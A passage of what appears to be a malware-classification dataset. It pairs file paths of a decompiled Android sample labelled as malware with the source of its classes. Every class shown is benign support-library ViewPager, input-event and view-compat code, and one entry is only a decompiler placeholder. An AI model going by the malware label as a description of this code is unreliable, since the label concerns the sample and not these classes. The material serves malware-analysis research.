boolean isTracking(    KeyEvent keyEvent){       return KeyEventCompatEclair.isTracking(keyEvent);     }     @Override public void startTracking(    KeyEvent keyEvent){       KeyEventCompatEclair.startTracking(keyEvent);     }   } class HoneycombKeyEventVersionImpl extends EclairKeyEventVersionImpl {     HoneycombKeyEventVersionImpl(){     }     @Override public boolean metaStateHasModifiers(    int i,    int i2){       return KeyEventCompatHoneycomb.metaStateHasModifiers(i,i2);     }     @Override public boolean metaStateHasNoModifiers(    int i){       return KeyEventCompatHoneycomb.metaStateHasNoModifiers(i);     }     @Override public int normalizeMetaState(    int i){       return KeyEventCompatHoneycomb.normalizeMetaState(i);     }   } interface KeyEventVersionImpl {     boolean dispatch(    KeyEvent keyEvent,    KeyEvent.Callback callback,    Object obj,    Object obj2);     Object getKeyDispatcherState(    View view);     boolean isTracking(    KeyEvent keyEvent);     boolean metaStateHasModifiers(    int i,    int i2);     boolean metaStateHasNoModifiers(    int i);     int normalizeMetaState(    int i);     void startTracking(    KeyEvent keyEvent);   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombKeyEventVersionImpl();     }  else {       IMPL=new BaseKeyEventVersionImpl();     }   }   public static boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2){     return IMPL.dispatch(keyEvent,callback,obj,obj2);   }   public static Object getKeyDispatcherState(  View view){     return IMPL.getKeyDispatcherState(view);   }   public static boolean hasModifiers(  KeyEvent keyEvent,  int i){     return IMPL.metaStateHasModifiers(keyEvent.getMetaState(),i);   }   public static boolean hasNoModifiers(  KeyEvent keyEvent){     return IMPL.metaStateHasNoModifiers(keyEvent.getMetaState());   }   public static boolean isTracking(  KeyEvent keyEvent){     return IMPL.isTracking(keyEvent);   }   public static boolean metaStateHasModifiers(  int i,  int i2){     return IMPL.metaStateHasModifiers(i,i2);   }   public static boolean metaStateHasNoModifiers(  int i){     return IMPL.metaStateHasNoModifiers(i);   }   public static int normalizeMetaState(  int i){     return IMPL.normalizeMetaState(i);   }   public static void startTracking(  KeyEvent keyEvent){     IMPL.startTracking(keyEvent);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\KeyEventCompatEclair.code","class KeyEventCompatEclair {   KeyEventCompatEclair(){   }   public static boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2){     return keyEvent.dispatch(callback,(KeyEvent.DispatcherState)obj,obj2);   }   public static Object getKeyDispatcherState(  View view){     return view.getKeyDispatcherState();   }   public static boolean isTracking(  KeyEvent keyEvent){     return keyEvent.isTracking();   }   public static void startTracking(  KeyEvent keyEvent){     keyEvent.startTracking();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\KeyEventCompatHoneycomb.code","class KeyEventCompatHoneycomb {   KeyEventCompatHoneycomb(){   }   public static boolean metaStateHasModifiers(  int i,  int i2){     return KeyEvent.metaStateHasModifiers(i,i2);   }   public static boolean metaStateHasNoModifiers(  int i){     return KeyEvent.metaStateHasNoModifiers(i);   }   public static int normalizeMetaState(  int i){     return KeyEvent.normalizeMetaState(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\KeyEventVersionImpl.code","interface KeyEventVersionImpl {   boolean dispatch(  KeyEvent keyEvent,  KeyEvent.Callback callback,  Object obj,  Object obj2);   Object getKeyDispatcherState(  View view);   boolean isTracking(  KeyEvent keyEvent);   boolean metaStateHasModifiers(  int i,  int i2);   boolean metaStateHasNoModifiers(  int i);   int normalizeMetaState(  int i);   void startTracking(  KeyEvent keyEvent); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\KitKatViewCompatImpl.code","class KitKatViewCompatImpl extends JbMr1ViewCompatImpl {   KitKatViewCompatImpl(){   }   @Override public int getAccessibilityLiveRegion(  View view){     return ViewCompatKitKat.getAccessibilityLiveRegion(view);   }   @Override public void setAccessibilityLiveRegion(  View view,  int i){     ViewCompatKitKat.setAccessibilityLiveRegion(view,i);   }   @Override public void setImportantForAccessibility(  View view,  int i){     ViewCompatJB.setImportantForAccessibility(view,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\LayoutParams.code","public class LayoutParams extends ViewGroup.LayoutParams {   int childIndex;   public int gravity;   public boolean isDecor;   boolean needsMeasure;   int position;   float widthFactor;   public LayoutParams(){     super(-1,-1);     this.widthFactor=0.0f;   }   public LayoutParams(  Context context,  AttributeSet attributeSet){     super(context,attributeSet);     this.widthFactor=0.0f;     TypedArray obtainStyledAttributes=context.obtainStyledAttributes(attributeSet,ViewPager.LAYOUT_ATTRS);     this.gravity=obtainStyledAttributes.getInteger(0,48);     obtainStyledAttributes.recycle();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\MotionEventCompat.code","public class MotionEventCompat {   public static final int ACTION_HOVER_ENTER=9;   public static final int ACTION_HOVER_EXIT=10;   public static final int ACTION_HOVER_MOVE=7;   public static final int ACTION_MASK=255;   public static final int ACTION_POINTER_DOWN=5;   public static final int ACTION_POINTER_INDEX_MASK=65280;   public static final int ACTION_POINTER_INDEX_SHIFT=8;   public static final int ACTION_POINTER_UP=6;   public static final int ACTION_SCROLL=8;   static final MotionEventVersionImpl IMPL; class BaseMotionEventVersionImpl implements MotionEventVersionImpl {     BaseMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent motionEvent,    int i){       return i == 0 ? 0 : -1;     }     @Override public int getPointerCount(    MotionEvent motionEvent){       return 1;     }     @Override public int getPointerId(    MotionEvent motionEvent,    int i){       if (i == 0) {         return 0;       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getX(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getX();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }     @Override public float getY(    MotionEvent motionEvent,    int i){       if (i == 0) {         return motionEvent.getY();       }       throw new IndexOutOfBoundsException(""Pre-Eclair does not support multiple pointers"");     }   } class EclairMotionEventVersionImpl implements MotionEventVersionImpl {     EclairMotionEventVersionImpl(){     }     @Override public int findPointerIndex(    MotionEvent motionEvent,    int i){       return MotionEventCompatEclair.findPointerIndex(motionEvent,i);     }     @Override public int getPointerCount(    MotionEvent motionEvent){       return MotionEventCompatEclair.getPointerCount(motionEvent);     }     @Override public int getPointerId(    MotionEvent motionEvent,    int i){       return MotionEventCompatEclair.getPointerId(motionEvent,i);     }     @Override public float getX(    MotionEvent motionEvent,    int i){       return MotionEventCompatEclair.getX(motionEvent,i);     }     @Override public float getY(    MotionEvent motionEvent,    int i){       return MotionEventCompatEclair.getY(motionEvent,i);     }   } interface MotionEventVersionImpl {     int findPointerIndex(    MotionEvent motionEvent,    int i);     int getPointerCount(    MotionEvent motionEvent);     int getPointerId(    MotionEvent motionEvent,    int i);     float getX(    MotionEvent motionEvent,    int i);     float getY(    MotionEvent motionEvent,    int i);   } static {     if (Build.VERSION.SDK_INT >= 5) {       IMPL=new EclairMotionEventVersionImpl();     }  else {       IMPL=new BaseMotionEventVersionImpl();     }   }   public static int findPointerIndex(  MotionEvent motionEvent,  int i){     return IMPL.findPointerIndex(motionEvent,i);   }   public static int getActionIndex(  MotionEvent motionEvent){     return (motionEvent.getAction() & 65280) >> 8;   }   public static int getActionMasked(  MotionEvent motionEvent){     return motionEvent.getAction() & 255;   }   public static int getPointerCount(  MotionEvent motionEvent){     return IMPL.getPointerCount(motionEvent);   }   public static int getPointerId(  MotionEvent motionEvent,  int i){     return IMPL.getPointerId(motionEvent,i);   }   public static float getX(  MotionEvent motionEvent,  int i){     return IMPL.getX(motionEvent,i);   }   public static float getY(  MotionEvent motionEvent,  int i){     return IMPL.getY(motionEvent,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\MotionEventCompatEclair.code","class MotionEventCompatEclair {   MotionEventCompatEclair(){   }   public static int findPointerIndex(  MotionEvent motionEvent,  int i){     return motionEvent.findPointerIndex(i);   }   public static int getPointerCount(  MotionEvent motionEvent){     return motionEvent.getPointerCount();   }   public static int getPointerId(  MotionEvent motionEvent,  int i){     return motionEvent.getPointerId(i);   }   public static float getX(  MotionEvent motionEvent,  int i){     return motionEvent.getX(i);   }   public static float getY(  MotionEvent motionEvent,  int i){     return motionEvent.getY(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\MotionEventVersionImpl.code","interface MotionEventVersionImpl {   int findPointerIndex(  MotionEvent motionEvent,  int i);   int getPointerCount(  MotionEvent motionEvent);   int getPointerId(  MotionEvent motionEvent,  int i);   float getX(  MotionEvent motionEvent,  int i);   float getY(  MotionEvent motionEvent,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\MyAccessibilityDelegate.code","!org.eclipse.jdt.core.dom.TypeDeclaration@9c0a8f8"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\OnAdapterChangeListener.code","public interface OnAdapterChangeListener {   void onAdapterChanged(  PagerAdapter pagerAdapter,  PagerAdapter pagerAdapter2); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\OnPageChangeListener.code","public interface OnPageChangeListener {   void onPageScrollStateChanged(  int i);   void onPageScrolled(  int i,  float f,  int i2);   void onPageSelected(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\PagerAdapter.code","public abstract class PagerAdapter {   public static final int POSITION_NONE=-2;   public static final int POSITION_UNCHANGED=-1;   private DataSetObservable mObservable=new DataSetObservable();   public void destroyItem(  View view,  int i,  Object obj){     throw new UnsupportedOperationException(""Required method destroyItem was not overridden"");   }   public void destroyItem(  ViewGroup viewGroup,  int i,  Object obj){     destroyItem((View)viewGroup,i,obj);   }   public void finishUpdate(  View view){   }   public void finishUpdate(  ViewGroup viewGroup){     finishUpdate((View)viewGroup);   }   public abstract int getCount();   public int getItemPosition(  Object obj){     return -1;   }   public CharSequence getPageTitle(  int i){     return null;   }   public float getPageWidth(  int i){     return 1.0f;   }   public Object instantiateItem(  View view,  int i){     throw new UnsupportedOperationException(""Required method instantiateItem was not overridden"");   }   public Object instantiateItem(  ViewGroup viewGroup,  int i){     return instantiateItem((View)viewGroup,i);   }   public abstract boolean isViewFromObject(  View view,  Object obj);   public void notifyDataSetChanged(){     this.mObservable.notifyChanged();   }   public void registerDataSetObserver(  DataSetObserver dataSetObserver){     this.mObservable.registerObserver(dataSetObserver);   }   public void restoreState(  Parcelable parcelable,  ClassLoader classLoader){   }   public Parcelable saveState(){     return null;   }   public void setPrimaryItem(  View view,  int i,  Object obj){   }   public void setPrimaryItem(  ViewGroup viewGroup,  int i,  Object obj){     setPrimaryItem((View)viewGroup,i,obj);   }   public void startUpdate(  View view){   }   public void startUpdate(  ViewGroup viewGroup){     startUpdate((View)viewGroup);   }   public void unregisterDataSetObserver(  DataSetObserver dataSetObserver){     this.mObservable.unregisterObserver(dataSetObserver);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\PagerObserver.code","public class PagerObserver extends DataSetObserver {   private PagerObserver(){   }   @Override public void onChanged(){     ViewPager.this.dataSetChanged();   }   @Override public void onInvalidated(){     ViewPager.this.dataSetChanged();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\PageTransformer.code","public interface PageTransformer {   void transformPage(  View view,  float f); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ParcelableCompat.code","public class ParcelableCompat { class CompatCreator<T> implements Parcelable.Creator<T> {     final ParcelableCompatCreatorCallbacks<T> mCallbacks;     public CompatCreator(    ParcelableCompatCreatorCallbacks<T> parcelableCompatCreatorCallbacks){       this.mCallbacks=parcelableCompatCreatorCallbacks;     }     @Override public T createFromParcel(    Parcel parcel){       return this.mCallbacks.createFromParcel(parcel,null);     }     @Override public T[] newArray(    int i){       return this.mCallbacks.newArray(i);     }   }   public static <T>Parcelable.Creator<T> newCreator(  ParcelableCompatCreatorCallbacks<T> parcelableCompatCreatorCallbacks){     if (Build.VERSION.SDK_INT >= 13) {       ParcelableCompatCreatorHoneycombMR2Stub.instantiate(parcelableCompatCreatorCallbacks);     }     return new CompatCreator(parcelableCompatCreatorCallbacks);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ParcelableCompatCreatorCallbacks.code","public interface ParcelableCompatCreatorCallbacks<T> {   T createFromParcel(  Parcel parcel,  ClassLoader classLoader);   T[] newArray(  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ParcelableCompatCreatorHoneycombMR2.code","class ParcelableCompatCreatorHoneycombMR2<T> implements Parcelable.ClassLoaderCreator<T> {   private final ParcelableCompatCreatorCallbacks<T> mCallbacks;   public ParcelableCompatCreatorHoneycombMR2(  ParcelableCompatCreatorCallbacks<T> parcelableCompatCreatorCallbacks){     this.mCallbacks=parcelableCompatCreatorCallbacks;   }   @Override public T createFromParcel(  Parcel parcel){     return this.mCallbacks.createFromParcel(parcel,null);   }   @Override public T createFromParcel(  Parcel parcel,  ClassLoader classLoader){     return this.mCallbacks.createFromParcel(parcel,classLoader);   }   @Override public T[] newArray(  int i){     return this.mCallbacks.newArray(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ParcelableCompatCreatorHoneycombMR2Stub.code","class ParcelableCompatCreatorHoneycombMR2Stub {   ParcelableCompatCreatorHoneycombMR2Stub(){   }   public static <T>Parcelable.Creator<T> instantiate(  ParcelableCompatCreatorCallbacks<T> parcelableCompatCreatorCallbacks){     return new ParcelableCompatCreatorHoneycombMR2(parcelableCompatCreatorCallbacks);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\SavedState.code","public class SavedState extends View.BaseSavedState {   public static final Parcelable.Creator<SavedState> CREATOR=ParcelableCompat.newCreator(new ParcelableCompatCreatorCallbacks<SavedState>(){     @Override public SavedState createFromParcel(    Parcel parcel,    ClassLoader classLoader){       return new SavedState(parcel,classLoader);     }     @Override public SavedState[] newArray(    int i){       return new SavedState[i];     }   } );   Parcelable adapterState;   ClassLoader loader;   int position;   SavedState(  Parcel parcel,  ClassLoader classLoader){     super(parcel);     classLoader=classLoader == null ? getClass().getClassLoader() : classLoader;     this.position=parcel.readInt();     this.adapterState=parcel.readParcelable(classLoader);     this.loader=classLoader;   }   public SavedState(  Parcelable parcelable){     super(parcelable);   }   public String toString(){     return ""FragmentPager.SavedState{"" + Integer.toHexString(System.identityHashCode(this)) + "" position=""+ this.position+ ""}"";   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     parcel.writeInt(this.position);     parcel.writeParcelable(this.adapterState,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\SimpleOnPageChangeListener.code","public class SimpleOnPageChangeListener implements OnPageChangeListener {   @Override public void onPageScrollStateChanged(  int i){   }   @Override public void onPageScrolled(  int i,  float f,  int i2){   }   @Override public void onPageSelected(  int i){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\VelocityTrackerCompat.code","public class VelocityTrackerCompat {   static final VelocityTrackerVersionImpl IMPL; class BaseVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     BaseVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker velocityTracker,    int i){       return velocityTracker.getXVelocity();     }     @Override public float getYVelocity(    VelocityTracker velocityTracker,    int i){       return velocityTracker.getYVelocity();     }   } class HoneycombVelocityTrackerVersionImpl implements VelocityTrackerVersionImpl {     HoneycombVelocityTrackerVersionImpl(){     }     @Override public float getXVelocity(    VelocityTracker velocityTracker,    int i){       return VelocityTrackerCompatHoneycomb.getXVelocity(velocityTracker,i);     }     @Override public float getYVelocity(    VelocityTracker velocityTracker,    int i){       return VelocityTrackerCompatHoneycomb.getYVelocity(velocityTracker,i);     }   } interface VelocityTrackerVersionImpl {     float getXVelocity(    VelocityTracker velocityTracker,    int i);     float getYVelocity(    VelocityTracker velocityTracker,    int i);   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new HoneycombVelocityTrackerVersionImpl();     }  else {       IMPL=new BaseVelocityTrackerVersionImpl();     }   }   public static float getXVelocity(  VelocityTracker velocityTracker,  int i){     return IMPL.getXVelocity(velocityTracker,i);   }   public static float getYVelocity(  VelocityTracker velocityTracker,  int i){     return IMPL.getYVelocity(velocityTracker,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\VelocityTrackerCompatHoneycomb.code","class VelocityTrackerCompatHoneycomb {   VelocityTrackerCompatHoneycomb(){   }   public static float getXVelocity(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getXVelocity(i);   }   public static float getYVelocity(  VelocityTracker velocityTracker,  int i){     return velocityTracker.getYVelocity(i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\VelocityTrackerVersionImpl.code","interface VelocityTrackerVersionImpl {   float getXVelocity(  VelocityTracker velocityTracker,  int i);   float getYVelocity(  VelocityTracker velocityTracker,  int i); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\ViewCompat.code","public class ViewCompat {   public static final int ACCESSIBILITY_LIVE_REGION_ASSERTIVE=2;   public static final int ACCESSIBILITY_LIVE_REGION_NONE=0;   public static final int ACCESSIBILITY_LIVE_REGION_POLITE=1;   private static final long FAKE_FRAME_TIME=10;   static final ViewCompatImpl IMPL;   public static final int IMPORTANT_FOR_ACCESSIBILITY_AUTO=0;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO=2;   public static final int IMPORTANT_FOR_ACCESSIBILITY_NO_HIDE_DESCENDANTS=4;   public static final int IMPORTANT_FOR_ACCESSIBILITY_YES=1;   public static final int LAYER_TYPE_HARDWARE=2;   public static final int LAYER_TYPE_NONE=0;   public static final int LAYER_TYPE_SOFTWARE=1;   public static final int LAYOUT_DIRECTION_INHERIT=2;   public static final int LAYOUT_DIRECTION_LOCALE=3;   public static final int LAYOUT_DIRECTION_LTR=0;   public static final int LAYOUT_DIRECTION_RTL=1;   public static final int MEASURED_HEIGHT_STATE_SHIFT=16;   public static final int MEASURED_SIZE_MASK=16777215;   public static final int MEASURED_STATE_MASK=-16777216;   public static final int MEASURED_STATE_TOO_SMALL=16777216;   public static final int OVER_SCROLL_ALWAYS=0;   public static final int OVER_SCROLL_IF_CONTENT_SCROLLS=1;   public static final int OVER_SCROLL_NEVER=2;   private static final String TAG=""ViewCompat"";   @IntDef({0,1,2}) @Retention(RetentionPolicy.SOURCE) @interface AccessibilityLiveRegion {} class BaseViewCompatImpl implements ViewCompatImpl {     private Method mDispatchFinishTemporaryDetach;     private Method mDispatchStartTemporaryDetach;     private boolean mTempDetachBound;     WeakHashMap<View,ViewPropertyAnimatorCompat> mViewPropertyAnimatorCompatMap=null;     BaseViewCompatImpl(){     }     private void bindTempDetach(){       try {         this.mDispatchStartTemporaryDetach=View.class.getDeclaredMethod(""dispatchStartTemporaryDetach"",new Class[0]);         this.mDispatchFinishTemporaryDetach=View.class.getDeclaredMethod(""dispatchFinishTemporaryDetach"",new Class[0]);       }  catch (      NoSuchMethodException e) {         Log.e(ViewCompat.TAG,""Couldn't find method"",e);       }       this.mTempDetachBound=true;     }     @Override public ViewPropertyAnimatorCompat animate(    View view){       return new ViewPropertyAnimatorCompat(view);     }     @Override public boolean canScrollHorizontally(    View view,    int i){       return false;     }     @Override public boolean canScrollVertically(    View view,    int i){       return false;     }     @Override public void dispatchFinishTemporaryDetach(    View view){       if (!this.mTempDetachBound) {         bindTempDetach();       }       if (this.mDispatchFinishTemporaryDetach == null) {         view.onFinishTemporaryDetach();         return;       }       try {         this.mDispatchFinishTemporaryDetach.invoke(view,new Object[0]);       }  catch (      Exception e) {         Log.d(ViewCompat.TAG,""Error calling dispatchFinishTemporaryDetach"",e);       }     }     @Override public void dispatchStartTemporaryDetach(    View view){       if (!this.mTempDetachBound) {         bindTempDetach();       }       if (this.mDispatchStartTemporaryDetach == null) {         view.onStartTemporaryDetach();         return;       }       try {         this.mDispatchStartTemporaryDetach.invoke(view,new Object[0]);       }  catch (      Exception e) {         Log.d(ViewCompat.TAG,""Error calling dispatchStartTemporaryDetach"",e);       }     }     @Override public int getAccessibilityLiveRegion(    View view){       return 0;     }     @Override public AccessibilityNodeProviderCompat getAccessibilityNodeProvider(    View view){       return null;     }     @Override public float getAlpha(    View view){       return 1.0f;     }     long getFrameTime(){       return ViewCompat.FAKE_FRAME_TIME;     }     @Override public int getImportantForAccessibility(    View view){       return 0;     }     @Override public int getLabelFor(    View view){       return 0;     }     @Override public int getLayerType(    View view){       return 0;     }     @Override public int getLayoutDirection(    View view){       return 0;     }     @Override public int getMeasuredHeightAndState(    View view){       return view.getMeasuredHeight();     }     @Override public int getMeasuredState(    View view){       return 0;     }     @Override public int getMeasuredWidthAndState(    View view){       return view.getMeasuredWidth();     }     @Override public int getMinimumHeight(    View view){       return 0;     }     @Override public int getMinimumWidth(    View view){       return 0;     }     @Override public int getOverScrollMode(    View view){       return 2;     }     @Override public int getPaddingEnd(    View view){       return view.getPaddingRight();     }     @Override public int getPaddingStart(    View view){       return view.getPaddingLeft();     }     @Override public ViewParent getParentForAccessibility(    View view){       return view.getParent();     }     @Override public float getPivotX(    View view){       return 0.0f;     }     @Override public float getPivotY(    View view){       return 0.0f;     }     @Override public float getRotation(    View view){       return 0.0f;     }     @Override public float getRotationX(    View view){       return 0.0f;     }     @Override public float getRotationY(    View view){       return 0.0f;     }     @Override public float getScaleX(    View view){       return 0.0f;     }     @Override public float getScaleY(    View view){       return 0.0f;     }     @Override public float getTranslationX(    View view){       return 0.0f;     }     @Override public float getTranslationY(    View view){       return 0.0f;     }     @Override public float getX(    View view){       return 0.0f;     }     @Override public float getY(    View view){       return 0.0f;     }     @Override public boolean hasTransientState(    View view){       return false;     }     @Override public boolean isOpaque(    View view){       Drawable background=view.getBackground();       return background != null && background.getOpacity() == -1;     }     @Override public void onInitializeAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public void onInitializeAccessibilityNodeInfo(    View view,    AccessibilityNodeInfoCompat accessibilityNodeInfoCompat){     }     @Override public void onPopulateAccessibilityEvent(    View view,    AccessibilityEvent accessibilityEvent){     }     @Override public boolean performAccessibilityAction(    View view,    int i,    Bundle bundle){       return false;     }     @Override public void postInvalidateOnAnimation(    View view){       view.invalidate();     }     @Override public void postInvalidateOnAnimation(    View view,    int i,    int i2,    int i3,    int i4){       view.invalidate(i,i2,i3,i4);     }     @Override public void postOnAnimation(    View view,    Runnable runnable){       view.postDelayed(runnable,getFrameTime());     }     @Override public void postOnAnimationDelayed(    View view,    Runnable runnable,    long j){       view.postDelayed(runnable,getFrameTime() + j);     }     @Override public int resolveSizeAndState(    int i,    int i2,    int i3){       return View.resolveSize(i,i2);     }     @Override public void setAccessibilityDelegate(    View view,    AccessibilityDelegateCompat accessibilityDelegateCompat){     }     @Override public void setAccessibilityLiveRegion(    View view,    int i){     }     @Override public void setAlpha(    View view,    float f){     }     @Override public void setHasTransientState(    View view,    boolean z){     }     @Override public void setImportantForAccessibility(    View view,    int i){     }     @Override public void setLabelFor(    View view,    int i){     }     @Override public void setLayerPaint(    View view,    Paint paint){     }     @Override public void setLayerType(    View view,    int i,    Paint paint){     }     @Override public void setLayoutDirection(    View view,    int i){     }     @Override public void setOverScrollMode(    View view,    int i){     }     @Override public void setPaddingRelative(    View view,    int i,    int i2,    int i3,    int i4){       view.setPadding(i,i2,i3,i4);     }     @Override public void setPivotX(    View view,    float f){     }     @Override public void setPivotY(    View view,    float f){     }     @Override public void setRotation(    View view,    float f){     }     @Override public void setRotationX(    View view,    float f){     }     @Override public void setRotationY(    View view,    float f){     }     @Override public void setScaleX(    View view,    float f){     }     @Override public void setScaleY(    View view,    float f){     }     @Override public void setTranslationX(    View view,    float f){     }     @Override public void setTranslationY(    View view,    float f){     }     @Override public void setX(    View view,    float f){     }     @Override public void setY(    View view,    float f){     }   } class EclairMr1ViewCompatImpl extends BaseViewCompatImpl {     EclairMr1ViewCompatImpl(){     }     @Override public boolean isOpaque(    View view){       return ViewCompatEclairMr1.isOpaque(view);     }   } class GBViewCompatImpl extends EclairMr1ViewCompatImpl {     GBViewCompatImpl(){     }     @Override public int getOverScrollMode(    View view){       return ViewCompatGingerbread.getOverScrollMode(view);     }     @Override public void setOverScrollMode(    View view,    int i){       ViewCompatGingerbread.setOverScrollMode(view,i);     }   } class HCViewCompatImpl extends GBViewCompatImpl {     HCViewCompatImpl(){     }     @Override public float getAlpha(    View view){       return ViewCompatHC.getAlpha(view);     }     @Override long getFrameTime(){       return ViewCompatHC.getFrameTime();     }     @Override public int getLayerType(    View view){       return ViewCompatHC.getLayerType(view);     }     @Override public int getMeasuredHeightAndState(    View view){       return ViewCompatHC.getMeasuredHeightAndState(view);     }     @Override public int getMeasuredState(    View view){       return ViewCompatHC.getMeasuredState(view);     }     @Override public int getMeasuredWidthAndState(    View view){       return ViewCompatHC.getMeasuredWidthAndState(view);     }     @Override public float getPivotX(    View view){       return ViewCompatHC.getPivotX(view);     }     @Override public float getPivotY(    View view){       return ViewCompatHC.getPivotY(view);     }     @Override public float getRotation(    View view){       return ViewCompatHC.getRotation(view);     }     @Override public float getRotationX(    View view){       return ViewCompatHC.getRotationX(view);     }     @Override public float getRotationY(    View view){       return ViewCompatHC.getRotationY(view);     }     @Override public float getScaleX(    View view){       return ViewCompatHC.getScaleX(view);     }     @Override public float getScaleY(    View view){       return ViewCompatHC.getScaleY(view);     }     @Override public float getTranslationX(    View view){       return ViewCompatHC.getTranslationX(view);     }     @Override public float getTranslationY(    View view){       return ViewCompatHC.getTranslationY(view);     }     @Override public float getX(    View view){       return ViewCompatHC.getX(view);     }     @Override public float getY(    View view){       return ViewCompatHC.getY(view);     }     @Override public int resolveSizeAndState(    int i,    int i2,    int i3){       return ViewCompatHC.resolveSizeAndState(i,i2,i3);     }     @Override public void setAlpha(    View view,    float f){       ViewCompatHC.setAlpha(view,f);     }     @Override public void setLayerPaint(    View view,    Paint paint){       setLayerType(view,getLayerType(view),paint);       view.invalidate();     }     @Override public void setLayerType(    View view,    int i,    Paint paint){       ViewCompatHC.setLayerType(view,i,paint);     }     @Override public void setPivotX(    View view,    float f){       ViewCompatHC.setPivotX(view,f);     }     @Override public void setPivotY(    View view,    float f){       ViewCompatHC.setPivotY(view,f);     }     @Override public void setRotation(    View view,    float f){       ViewCompatHC.setRotation(view,f);     }     @Override public void setRotationX(    View view,    float f){       ViewCompatHC.setRotationX(view,f);     }     @Override public void setRotationY(    View view,    float f){       ViewCompatHC.setRotationY(view,f);     }     @Override public void setScaleX(    View view,    float f){       ViewCompatHC.setScaleX(view,f);     }     @Override public void setScaleY(    View view,    float f){       ViewCompatHC.setScaleY(view,f);     }     @Override public void setTranslationX(    View view,    float f){       ViewCompatHC.setTranslationX(view,f);     }     @Override public void setTranslationY(    View view,    float f){       ViewCompatHC.setTranslationY(view,f);     }     @Override public void setX(    View view,    float f){       ViewCompatHC.setX(view,f);     }     @Override public void setY(    View view,    float f){       ViewCompatHC.setY(view,f);     }   } class ICSViewCompatImpl extends HCViewCompatImpl {     ICSViewCompatImpl(){     }     @Override public ViewPropertyAnimatorCompat animate(    View view){       if (this.mViewPropertyAnimatorCompatMap == null) {         this.mViewPropertyAnimatorCompatMap=new WeakHashMap<>();       }       ViewPropertyAnimatorCompat viewPropertyAnimatorCompat=this.mViewPropertyAnimatorCompatMap.get(view);       if (viewPropertyAnimatorCompat 